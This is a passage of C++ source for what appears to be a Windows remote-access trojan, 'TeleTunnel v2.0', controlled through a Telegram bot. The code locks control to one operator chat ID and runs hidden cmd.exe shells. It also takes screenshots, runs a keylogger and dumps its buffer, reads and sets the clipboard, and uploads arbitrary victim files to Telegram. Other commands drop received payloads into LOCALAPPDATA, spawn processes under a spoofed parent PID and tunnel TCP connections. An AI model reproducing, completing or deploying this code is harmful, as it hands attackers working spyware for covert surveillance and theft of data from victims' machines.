            if (elapsed < static_cast<DWORD>(Cfg::ANTISPIN_THRESH_MS)) Sleep(Cfg::ANTISPIN_SLEEP_MS);

            json j;
            try { j = json::parse(resp); } catch (...) { continue; }
            if (!j.value("ok", false)) continue;

            for (const auto& upd : j.value("result", json::array())) {
                long long uid = upd.value("update_id", 0LL);
                if (uid >= offset_) offset_ = uid + 1;

                const auto& msg = upd.value("message", json::object());
                if (msg.is_null() || msg.empty()) continue;

                // AUTH CHECK : to reject any sender that isn't my CHAT_ID so nobady will take our C2 from us lol
                std::string fromId = std::to_string(msg.value("from", json::object()).value("id", 0LL));
                if (fromId != Cfg::CHAT_ID) continue;

                // File upload --
                if (msg.contains("document")) {
                    const auto& doc = msg["document"];
                    std::string fid  = doc.value("file_id", "");
                    std::string fname = doc.value("file_name", "dropped_file.bin");
                    if (!fid.empty()) downloadFile(fid, fname);
                }

                std::string text = msg.value("text", "");
                if (!text.empty()) {
                    auto* param = new std::pair<TelegramBot*, std::string>(this, text);
                    HANDLE h = CreateThread(nullptr, 0, handlerThread, param, 0, nullptr);
                    if (h) CloseHandle(h); else delete param;
                }
            }
        }
    }

    void downloadFile(const std::string& fileId, const std::string& fileName) {
        std::string resp = http_.request("GET", Cfg::API_PATH + "/getFile?file_id=" + fileId);
        json j; try { j = json::parse(resp); } catch (...) { sendText("✗ Failed to parse getFile response"); return; }
        std::string filePath = j.value("result", json::object()).value("file_path", "");
        if (filePath.empty()) { sendText("✗ Empty file_path from API"); return; }

        std::string url = "https://api.telegram.org/file/bot" + Cfg::TOKEN + "/" + filePath;
        auto data = http_.fetch(url);
        if (data.empty()) { sendText("✗ Download returned 0 bytes"); return; }

        char appData[MAX_PATH]; GetEnvironmentVariableA("LOCALAPPDATA", appData, MAX_PATH);
        std::string dropPath = std::string(appData) + "\\Temp\\" + fileName;
        CreateDirectoryA((std::string(appData) + "\\Temp").c_str(), nullptr);
        std::ofstream f(dropPath, std::ios::binary);
        if (!f) { dropPath = std::string(appData) + "\\" + fileName; f.open(dropPath, std::ios::binary); }
        if (f) {
            f.write(reinterpret_cast<const char*>(data.data()), data.size());
            trackDrop(dropPath);
            sendText("✓ **ᴅʀᴏᴘᴘᴇᴅ:** `" + dropPath + "`\n-> Size: `" + std::to_string(data.size()) + "` bytes");
        } else sendText("✗ Write failed");
    }

    void handleMessage(const std::string& raw) {
        std::string cmd = raw;
        cmd.erase(0, cmd.find_first_not_of(" \t\n\r"));
        cmd.erase(cmd.find_last_not_of(" \t\n\r") + 1);

        std::smatch m;

        if (cmd == "help" || cmd == "Help" || cmd == "/help" || cmd == "/start") { sendHelp(); return; }

        // --shell command --
        if (!cmd.empty() && cmd[0] == '>') {
            runCmd(cmd.substr(1));
            return;
        }

        // sysinfo-------
        if (cmd == "sysinfo" || cmd == "si" || cmd == "info" || cmd == "Sysinfo") {
            sendText("🔍 Analyzing...");
            sendText(SysInfo::collect());
            return;
        }

        // -screenshot----
        if (cmd == "screenshot" || cmd == "ss" || cmd == "Ss" || cmd == "Screenshot") {
            sendText("📸 Capturing...");
            auto png = Screenshot::capture();
            if (png.empty()) sendText("✗ Screenshot failed.");
            else sendDocument("📸 Desktop Capture", png, "screenshot.png");
            return;
        }

        // -keylogger-------
        if (std::regex_match(cmd, m, std::regex(R"(keylog\s*(\S*))", std::regex::icase))) {
            std::string sub = m[1]; std::transform(sub.begin(), sub.end(), sub.begin(), ::tolower);
            handleKeylog(sub.empty() ? "status" : sub);
            return;
        }

        // rocess list----
        if (cmd == "pids" || cmd == "ps" || cmd == "ps" || cmd == "Pids") {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == INVALID_HANDLE_VALUE) { sendText("✗ Snapshot failed"); return; }
            std::stringstream ss; ss << "**ᴘʀᴏᴄᴇssᴇs:**\n";
            PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
            const char* targets[] = { "explorer.exe","svchost.exe","lsass.exe","winlogon.exe", nullptr };
            if (Process32First(hSnap, &pe)) do {
                for (int i = 0; targets[i]; ++i)
                    if (_stricmp(pe.szExeFile, targets[i]) == 0)
                        ss << "`" << pe.th32ProcessID << "` " << pe.szExeFile << "\n";
            } while (Process32Next(hSnap, &pe));
            CloseHandle(hSnap);
            sendText(ss.str());
            return;
        }

        // PPID spoofin
        if (std::regex_match(cmd, m, std::regex(R"(spawn\s+(\d+)\s+(.*))", std::regex::icase))) {
            std::string arg = m[2];
            size_t p;
            while ((p = arg.find("$LAST")) != std::string::npos) arg.replace(p, 5, drops_.empty() ? "" : drops_.back());
            for (size_t i = 0; i < drops_.size(); ++i) {
                std::string v = "$" + std::to_string(i + 1);
                while ((p = arg.find(v)) != std::string::npos) arg.replace(p, v.size(), drops_[i]);
            }
            sendText(PPIDSpoof::spawn(std::stoul(m[1]), arg));
            return;
        }

        // file download from from host
        if (std::regex_match(cmd, m, std::regex(R"(get\s+(.*))", std::regex::icase))) {
            std::string path = m[1];
            if (path.size() >= 2 && path.front() == '"') path = path.substr(1, path.size() - 2);
            std::ifstream f(path, std::ios::binary);
            if (!f) { sendText("✗ Cannot open `" + path + "`"); return; }
            std::vector<uint8_t> data((std::istreambuf_iterator<char>(f)), {});
            if (data.empty()) { sendText("✗ File is empty"); return; }
            std::string fn = path.substr(path.find_last_of("\\/") + 1);
            sendDocument("📎 `" + fn + "` (" + std::to_string(data.size()) + " bytes)", data, fn);
            return;
        }

        // clipboard
        if (std::regex_match(cmd, m, std::regex(R"(clip\s*(.*))", std::regex::icase))) {
            std::string sub = m[1]; sub.erase(0, sub.find_first_not_of(' '));
            if (sub == "get") {
                if (!OpenClipboard(nullptr)) { sendText("✗ Cannot open clipboard"); return; }
                HANDLE h = GetClipboardData(CF_TEXT);
                std::string text = h ? std::string(static_cast<char*>(GlobalLock(h))) : "(empty)";
                if (h) GlobalUnlock(h); CloseClipboard();
                sendText("**Clipboard:**\n```\n" + text + "\n```");
            } else {
                std::string text = sub.size() > 4 && sub.substr(0, 4) == "set " ? sub.substr(4) : sub;
                if (OpenClipboard(nullptr)) {
                    EmptyClipboard();
                    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
                    if (hg) { memcpy(GlobalLock(hg), text.c_str(), text.size() + 1); GlobalUnlock(hg); SetClipboardData(CF_TEXT, hg); }
                    CloseClipboard();
                    sendText("✓ Clipboard set to `" + text + "`");
                } else sendText("✗ Cannot open clipboard");
            }
            return;
        }

        // ls
        if (std::regex_match(cmd, m, std::regex(R"(ls\s*(.*))", std::regex::icase))) {
            std::string dir = m[1]; dir.erase(0, dir.find_first_not_of(' '));
            if (dir.empty()) { char cwd[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, cwd); dir = cwd; }
            WIN32_FIND_DATAA fd; HANDLE hf = FindFirstFileA((dir + "\\*").c_str(), &fd);
            if (hf == INVALID_HANDLE_VALUE) { sendText("✗ Cannot list `" + dir + "`"); return; }
            std::stringstream ss; ss << "📁 `" << dir << "`\n";
            do {
                std::string n = fd.cFileName;
                if (n == "." || n == "..") continue;
                bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY);
                ss << (isDir ? "├──📂 " : "├──📄 ") << n;
                if (!isDir) {
                    ULARGE_INTEGER sz; sz.LowPart = fd.nFileSizeLow; sz.HighPart = fd.nFileSizeHigh;
                    ss << " (" << sz.QuadPart / 1024 << " KB)";
                }
                ss << "\n";
            } while (FindNextFileA(hf, &fd));
            FindClose(hf);
            sendText(ss.str());
            return;
        }

        // dropped files
        if (cmd == "drops" || cmd == "Drops") {
            if (drops_.empty()) { sendText("✗ No drops yet"); return; }
            std::stringstream ss; ss << "📦 **Dropped Files:**\n";
            for (size_t i = 0; i < drops_.size(); ++i) ss << "`$" << (i+1) << "` " << drops_[i] << "\n";
            sendText(ss.str());
            return;
        }

        // TCP tunneling
        if (std::regex_match(cmd, m, std::regex(R"(open\s+(\S+)\s+to\s+(\S+))", std::regex::icase))) {
            streams_.open(m[1], m[2]); return;
        }
        if (std::regex_match(cmd, m, std::regex(R"(send\s+(\S+):\s*(.*))", std::regex::icase))) {
            std::string data = m[2];
            size_t p; while ((p = data.find("\\n")) != std::string::npos) data.replace(p, 2, "\n");
                      while ((p = data.find("\\r")) != std::string::npos) data.replace(p, 2, "\r");
            streams_.send(m[1], data); return;
        }
        if (std::regex_match(cmd, m, std::regex(R"(close\s+(\S+))", std::regex::icase))) {
            streams_.close(m[1]); return;
        }
        if (cmd == "streams" || cmd == "Streams") { sendText(streams_.listAll()); return; }

        // kill agent 
        if (cmd == "kill" || cmd == "Kill") {
            sendText("💀 Agent shutting down. Bye Master.");
            Sleep(1000); ExitProcess(0);
        }

        sendText("[WTF ?] Unknown command man. Send `help`.");
    }

    void runCmd(std::string cmd) {
        cmd.erase(0, cmd.find_first_not_of(' '));
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) { sendText("✗ Pipe failed"); return; }
        SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si{ sizeof(si) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = si.hStdError = hWrite;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};
        std::string full = "cmd.exe /c " + cmd;

        if (!CreateProcessA(nullptr, (char*)full.c_str(), nullptr, nullptr, TRUE,
                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hWrite); CloseHandle(hRead);
            sendText("✗ CreateProcess failed"); return;
        }
        CloseHandle(hWrite);

        std::string out; char buf[4096]; DWORD rd;
        DWORD t0 = GetTickCount(); bool killed = false;
        while (true) {
            DWORD avail = 0; PeekNamedPipe(hRead, nullptr, 0, nullptr, &avail, nullptr);
            if (avail > 0) {
                if (ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) && rd) out.append(buf, rd);
            } else {
                if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                    while (ReadFile(hRead, buf, sizeof(buf), &rd, nullptr) && rd) out.append(buf, rd);
                    break;
                }
                if (GetTickCount() - t0 > static_cast<DWORD>(Cfg::CMD_TIMEOUT_MS)) {
                    TerminateProcess(pi.hProcess, 9);
                    out += "\n⚠ Timed out."; killed = true; break;
                }
            }
        }
        CloseHandle(hRead); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if (out.empty()) out = "(no output)";

        if (out.size() > Cfg::FILE_THRESHOLD) {
            sendDocument("`" + cmd + "` output", {out.begin(), out.end()}, "output.txt"); return;
        }
        if (out.size() > Cfg::MSG_MAX_CHARS) {
            for (size_t i = 0; i < out.size(); i += Cfg::MSG_MAX_CHARS)
                sendText("```\n" + out.substr(i, Cfg::MSG_MAX_CHARS) + "\n```");
        } else {
            sendText("CMD : `" + cmd + "`\n```\n" + out + "\n```");
        }
    }

    void handleKeylog(const std::string& sub) {
        if (sub == "start") {
            if (keylogger_.isRunning()) { sendText("✓ Already running"); return; }
            sendText(keylogger_.start() ? "✓ Keylogger started" : "⚠ Hook failed");
        } else if (sub == "stop") {
            if (!keylogger_.isRunning()) { sendText("✗ Not running"); return; }
            keylogger_.stop(); sendText("✓ Keylogger stopped");
        } else if (sub == "dump") {
            std::string data = keylogger_.dump();
            if (data.empty()) { sendText("⚠ Buffer empty"); return; }
            if (data.size() > Cfg::FILE_THRESHOLD)
                sendDocument("[+] Keylog dump", {data.begin(), data.end()}, "keylog.txt");
            else
                sendText("▸ **Keylog:**\n```\n" + data + "\n```");
        } else if (sub == "status") {
            sendText(std::string("▸ Keylogger: ") + (keylogger_.isRunning() ? "✓ Running" : "⚠ Stopped") +
                     "\n▸ Keys: `" + std::to_string(keylogger_.count()) + "`");
        } else {
            sendText("Usage: `keylog start` | `stop` | `dump` | `status`");
        }
    }

    void sendHelp() {
        char buf[256]; DWORD sz = 256;
        std::string user = "?", host = "?";
        if (GetUserNameA(buf, &sz)) user = buf; sz = 256;
        if (GetComputerNameA(buf, &sz)) host = buf;

        sendText(
            "**ᴛᴇʟᴇᴛᴜɴɴᴇʟ ᴠ2.0**\n"
            "────────────────────\n"
            "👤 **Identity:** `" + user + "@" + host + "`\n\n"
            "🛠 **ʀᴇᴄᴏɴɴᴀɪssᴀɴᴄᴇ**\n"
            "├── `sysinfo`  - Full system report\n"
            "├── `ss`       - Desktop capture\n"
            "├── `ps`       - Process listing\n"
            "└── `ls <path>`- Directory browser\n\n"
            "⚡️ **ᴄᴏᴍᴍᴀɴᴅ ᴄᴇɴᴛᴇʀ**\n"
            "├── `> <cmd>`  - Native shell\n"
            "├── `spawn <PID> <cmd>` - Spoofed exec\n"
            "├── `clip get/set` - Clipboard manager\n"
            "└── `kill`     - Self-destruct\n\n"
            "💾 **ғɪʟᴇ ᴏᴘᴇʀᴀᴛɪᴏɴs**\n"
            "├── `get <path>` - Download from host\n"
            "├── `[Drag/Drop]`- Upload to host\n"
            "└── `drops`     - List uploads ($1, $LAST)\n\n"
            "⌨️ **ᴋᴇʏʟᴏɢɢᴇʀ**\n"
            "└── `keylog <start|stop|dump|status>`\n\n"
            "📡 **ᴛᴜɴɴᴇʟɪɴɢ**\n"
            "└── `open|send|close|streams`\n"
            "────────────────────"
        );
    }

    // ---- static thread entry points ----
    static DWORD WINAPI senderThread (LPVOID p) { static_cast<TelegramBot*>(p)->senderLoop(); return 0; }
    static DWORD WINAPI pollerThread (LPVOID p) { static_cast<TelegramBot*>(p)->pollerLoop(); return 0; }
    static DWORD WINAPI handlerThread(LPVOID p) {
        auto* pr = static_cast<std::pair<TelegramBot*, std::string>*>(p);
        pr->first->handleMessage(pr->second);
        delete pr;
        return 0;
    }

    friend class StreamManager;
};

// ============================================================
// § 11 (impl)  STREAM MANAGER
// ============================================================
void StreamManager::open(const std::string& id, const std::string& target) {
    size_t col = target.rfind(':');
    if (col == std::string::npos) { bot_.sendText("❌ Use `host:port` format"); return; }
    std::string host = target.substr(0, col), port = target.substr(col + 1);

    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res)) { bot_.sendText("❌ DNS failed"); WSACleanup(); return; }

    SOCKET sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET || connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
        if (sock != INVALID_SOCKET) closesocket(sock);
        freeaddrinfo(res); bot_.sendText("❌ Connection failed"); WSACleanup(); return;
    }
    freeaddrinfo(res);

    auto s = std::make_unique<Stream>();
    s->socket = sock; s->active = true;
    using Param = std::pair<StreamManager*, std::pair<std::string, SOCKET>>;
    s->thread = CreateThread(nullptr, 0, readerThread,
                             new Param(this, {id, sock}), 0, nullptr);

    { LockGuard lg(mu_); streams_[id] = std::move(s); }
    bot_.sendText("✅ Stream `" + id + "` connected to `" + target + "`");
}

void StreamManager::send(const std::string& id, std::string data) {
    LockGuard lg(mu_);
    auto it = streams_.find(id);
    if (it == streams_.end()) { bot_.sendText("❌ Stream `" + id + "` not found"); return; }
    ::send(it->second->socket, data.c_str(), (int)data.size(), 0);
    std::string prev = data.substr(0, 100); std::replace(prev.begin(), prev.end(), '\n', ' ');
    bot_.sendText("📤 Sent to `" + id + "`: `" + prev + (data.size() > 100 ? "..." : "") + "`");
}

void StreamManager::close(const std::string& id) {
    LockGuard lg(mu_);
    auto it = streams_.find(id);
    if (it == streams_.end()) { bot_.sendText("❌ Stream `" + id + "` not found"); return; }
    it->second->active = false; closesocket(it->second->socket);
    if (it->second->thread) CloseHandle(it->second->thread);
    streams_.erase(it);
    bot_.sendText("✅ Stream `" + id + "` closed");
}

std::string StreamManager::listAll() {
    LockGuard lg(mu_);
    if (streams_.empty()) return "📡 No open streams";
    std::string r = "📡 **Open streams:**\n";
    for (const auto& kv : streams_) r += "• `" + kv.first + "`\n";
    return r;
}

DWORD WINAPI StreamManager::readerThread(LPVOID p) {
    using Param = std::pair<StreamManager*, std::pair<std::string, SOCKET>>;
    auto* par = static_cast<Param*>(p);
    par->first->readLoop(par->second.first, par->second.second);
    delete par; return 0;
}

void StreamManager::readLoop(const std::string& id, SOCKET sock) {
    int longTo = Cfg::SOCKET_LONG_TO_MS, shortTo = Cfg::SOCKET_SHORT_TO_MS;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&longTo, sizeof(longTo));
    std::vector<uint8_t> buf;
    while (true) {
        char tmp[4096]; int n = recv(sock, tmp, sizeof(tmp), 0);
        if (n <= 0) break;
        buf.insert(buf.end(), tmp, tmp + n);
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&shortTo, sizeof(shortTo));
        while ((n = recv(sock, tmp, sizeof(tmp), 0)) > 0) buf.insert(buf.end(), tmp, tmp + n);
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&longTo, sizeof(longTo));
        if (!buf.empty()) { onData(id, buf); buf.clear(); }
    }
    bot_.sendText("🔌 Stream `" + id + "` closed by remote");
}

void StreamManager::onData(const std::string& id, const std::vector<uint8_t>& data) {
    const char* sep = "\r\n\r\n";
    auto it = std::search(data.begin(), data.end(), sep, sep + 4);
    if (it != data.end() && data.size() >= 4 &&
        data[0]=='H' && data[1]=='T' && data[2]=='T' && data[3]=='P') {
        std::string headers(data.begin(), it);
        bot_.sendText("📋 **HTTP Headers (" + id + "):**\n```\n" + headers + "\n```");
        std::vector<uint8_t> body(it + 4, data.end());
        if (!body.empty()) bot_.sendDocument("📦 Body (" + id + ")", body, id + "_body.bin");
        return;
    }
    bool isText = true;
    for (uint8_t c : data) if (c < 32 && c != '\n' && c != '\r' && c != '\t') { isText = false; break; }
    if (isText) {
        std::string txt(data.begin(), data.end());
        if (txt.size() > Cfg::MSG_MAX_CHARS) txt = txt.substr(0, Cfg::MSG_MAX_CHARS) + "...";
        bot_.sendText("📨 **" + id + ":**\n```\n" + txt + "\n```");
    } else {
        bot_.sendDocument("📨 " + id + " (" + std::to_string(data.size()) + " bytes)", data, id + ".bin");
    }
}

// ============================================================
// § 16  MAIN ENTRY POINT !!
// ==============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    DynAPI::init();

    TelegramBot bot;
    bot.start();
    return 0;
}